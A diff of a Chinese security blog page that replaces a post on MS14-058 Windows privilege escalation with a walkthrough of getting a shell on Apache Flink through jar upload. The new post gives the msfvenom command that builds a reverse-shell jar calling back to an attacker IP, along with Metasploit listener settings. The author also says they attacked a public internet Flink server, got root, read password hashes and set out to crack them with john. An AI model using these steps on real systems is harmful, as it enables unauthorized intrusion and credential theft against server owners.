@@ -96,24 +96,25 @@
 
 
 
-  <meta name="description" content="其实是本来想找一个提权windows 2008 R2的，在msf上尝试了很多无果">
-<meta name="keywords" content="提权">
+  <meta name="description" content="Apache Flink下载地址：1https://mirrors.tuna.tsinghua.edu.cn/apache/flink/flink-1.9.1/flink-1.9.1-bin-scala_2.11.tgz">
+<meta name="keywords" content="漏洞复现">
 <meta property="og:type" content="article">
-<meta property="og:title" content="MS14-058提权">
-<meta property="og:url" content="http://yoursite.com/2019/10/18/MS14-058提权/index.html">
+<meta property="og:title" content="Apache Flink Jar包上传getshell漏洞">
+<meta property="og:url" content="http://yoursite.com/2019/11/14/Apache-Flink-Jar包上传getshell漏洞/index.html">
 <meta property="og:site_name" content="Sriracha :)">
-<meta property="og:description" content="其实是本来想找一个提权windows 2008 R2的，在msf上尝试了很多无果">
+<meta property="og:description" content="Apache Flink下载地址：1https://mirrors.tuna.tsinghua.edu.cn/apache/flink/flink-1.9.1/flink-1.9.1-bin-scala_2.11.tgz">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="http://yoursite.com/2019/10/18/MS14-058提权/msf.png">
-<meta property="og:image" content="http://yoursite.com/2019/10/18/MS14-058提权/02.png">
-<meta property="og:image" content="http://yoursite.com/2019/10/18/MS14-058提权/08.png">
-<meta property="og:image" content="http://yoursite.com/2019/10/18/MS14-058提权/07.png">
-<meta property="og:image" content="http://yoursite.com/2019/10/18/MS14-058提权/false.png">
-<meta property="og:updated_time" content="2019-10-18T05:35:04.660Z">
+<meta property="og:image" content="http://yoursite.com/2019/11/14/Apache-Flink-Jar包上传getshell漏洞/start.png">
+<meta property="og:image" content="http://yoursite.com/2019/11/14/Apache-Flink-Jar包上传getshell漏洞/dashboard.png">
+<meta property="og:image" content="http://yoursite.com/2019/11/14/Apache-Flink-Jar包上传getshell漏洞/submit.png">
+<meta property="og:image" content="http://yoursite.com/2019/11/14/Apache-Flink-Jar包上传getshell漏洞/shell.png">
+<meta property="og:image" content="http://yoursite.com/2019/11/14/Apache-Flink-Jar包上传getshell漏洞/ip.png">
+<meta property="og:image" content="http://yoursite.com/2019/11/14/Apache-Flink-Jar包上传getshell漏洞/shadow.png">
+<meta property="og:updated_time" content="2019-11-14T12:36:22.761Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="MS14-058提权">
-<meta name="twitter:description" content="其实是本来想找一个提权windows 2008 R2的，在msf上尝试了很多无果">
-<meta name="twitter:image" content="http://yoursite.com/2019/10/18/MS14-058提权/msf.png">
+<meta name="twitter:title" content="Apache Flink Jar包上传getshell漏洞">
+<meta name="twitter:description" content="Apache Flink下载地址：1https://mirrors.tuna.tsinghua.edu.cn/apache/flink/flink-1.9.1/flink-1.9.1-bin-scala_2.11.tgz">
+<meta name="twitter:image" content="http://yoursite.com/2019/11/14/Apache-Flink-Jar包上传getshell漏洞/start.png">
 
 
 
@@ -122,7 +123,7 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2019/10/18/MS14-058提权/">
+  <link rel="canonical" href="http://yoursite.com/2019/11/14/Apache-Flink-Jar包上传getshell漏洞/">
 
 
 
@@ -132,7 +133,7 @@
   };
 </script>
 
-  <title>MS14-058提权 | Sriracha :)</title>
+  <title>Apache Flink Jar包上传getshell漏洞 | Sriracha :)</title>
   
 
 
@@ -403,7 +404,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/10/18/MS14-058提权/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/11/14/Apache-Flink-Jar包上传getshell漏洞/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="sher10ck">
@@ -420,7 +421,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">MS14-058提权
+          <h1 class="post-title" itemprop="name headline">Apache Flink Jar包上传getshell漏洞
 
               
             
@@ -446,7 +447,7 @@
                 
               
 
-              <time title="创建时间：2019-10-18 13:04:10 / 修改时间：13:35:04" itemprop="dateCreated datePublished" datetime="2019-10-18T13:04:10+08:00">2019-10-18</time>
+              <time title="创建时间：2019-11-14 18:35:46 / 修改时间：20:36:22" itemprop="dateCreated datePublished" datetime="2019-11-14T18:35:46+08:00">2019-11-14</time>
             
 
             
@@ -484,16 +485,18 @@
       
 
       
-        <p>其实是本来想找一个提权windows 2008 R2的，在msf上尝试了很多无果<br><a id="more"></a><br><img src="/2019/10/18/MS14-058提权/msf.png" alt></p>
-<p>secwiki上的<a href="https://github.com/SecWiki/windows-kernel-exploits" title="windows-kernel-exploits" target="_blank" rel="noopener">windows-kernel-exploits</a>找到了可利用的工具</p>
-<p>这里测试了几个版本</p>
-<p>windows server 2003 Standard x32<br><img src="/2019/10/18/MS14-058提权/02.png" alt><br>成功</p>
-<p>windows server 2008 r2 x64<br><img src="/2019/10/18/MS14-058提权/08.png" alt><br>成功</p>
-<p>windows7 Service Pack 1<br><img src="/2019/10/18/MS14-058提权/07.png" alt><br>失败</p>
-<p>然后在msf寻找MS14-058的一个exp进行利用</p>
-<p><img src="/2019/10/18/MS14-058提权/false.png" alt><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[*] Started reverse TCP handler on 172.16.28.125:4444 </span><br><span class="line">[-] Exploit aborted due to failure: no-target: Session host is x64, but the target is specified as x86</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br></pre></td></tr></table></figure></p>
-<p>这里报了错误，看来msf也不是万能的</p>
-<p>微软官网对此漏洞的介绍：<br><a href="https://docs.microsoft.com/zh-cn/security-updates/Securitybulletins/2014/ms14-058?redirectedfrom=MSDN" title="https://docs.microsoft.com/zh-cn/security-updates/Securitybulletins/2014/ms14-058?redirectedfrom=MSDN" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/security-updates/Securitybulletins/2014/ms14-058?redirectedfrom=MSDN</a></p>
+        <p>Apache Flink下载地址：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://mirrors.tuna.tsinghua.edu.cn/apache/flink/flink-1.9.1/flink-1.9.1-bin-scala_2.11.tgz</span><br></pre></td></tr></table></figure></p>
+<a id="more"></a>
+<p>解压，进入bin目录，运行start-cluster.sh<br><img src="/2019/11/14/Apache-Flink-Jar包上传getshell漏洞/start.png" alt></p>
+<p>访问 <a href="http://ip:8081" target="_blank" rel="noopener">http://ip:8081</a></p>
+<p><img src="/2019/11/14/Apache-Flink-Jar包上传getshell漏洞/dashboard.png" alt></p>
+<p>Kali启动<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/meterpreter/reverse_tcp LHOST=192.168.43.128 LPORT=4444 -f jar &gt; rce.jar</span><br></pre></td></tr></table></figure></p>
+<p>生成jar文件木马，上传<br><img src="/2019/11/14/Apache-Flink-Jar包上传getshell漏洞/submit.png" alt></p>
+<p>msf打开监听<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload java/shell/reverse_tcp</span><br><span class="line">set LHOST 192.168.43.128</span><br><span class="line">run</span><br></pre></td></tr></table></figure></p>
+<p>点击控制台里面的submit，看见shell反弹回来啦<br><img src="/2019/11/14/Apache-Flink-Jar包上传getshell漏洞/shell.png" alt></p>
+<p>不过msf这里只有内网环境，刚好前两天小伙伴分享了frp内网穿透，就去配置了一下，然后在公网上找到了一个可以利用的点<br><img src="/2019/11/14/Apache-Flink-Jar包上传getshell漏洞/ip.png" alt></p>
+<p>还尼玛是root权限，这个漏洞危害真的高，可惜公网数量太少了<br><img src="/2019/11/14/Apache-Flink-Jar包上传getshell漏洞/shadow.png" alt></p>
+<p>看到hash之后，用Kali下的john爆破</p>
 
       
     </div>
@@ -517,7 +520,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/提权/" rel="tag"># 提权</a>
+            <a href="/tags/漏洞复现/" rel="tag"># 漏洞复现</a>
           
         </div>
       
@@ -530,8 +533,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/10/17/通过Navicat进行数据库提权/" rel="next" title="通过Navicat进行数据库提权">
-                <i class="fa fa-chevron-left"></i> 通过Navicat进行数据库提权
+              <a href="/2019/11/11/JBosS-AS-6-X-反序列化漏洞-CVE-2017-12149/" rel="next" title="JBoss AS 6.X 反序列化漏洞+getshell+实战(CVE-2017-12149)">
+                <i class="fa fa-chevron-left"></i> JBoss AS 6.X 反序列化漏洞+getshell+实战(CVE-2017-12149)
               </a>
             
           </div>
@@ -539,10 +542,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/10/19/kibana-6-6-0漏洞复现/" rel="prev" title="kibana<6.6.0漏洞复现">
-                kibana<6.6.0漏洞复现 <i class="fa fa-chevron-right">
-              </6.6.0漏洞复现></a>
             
           </div>
         </div>
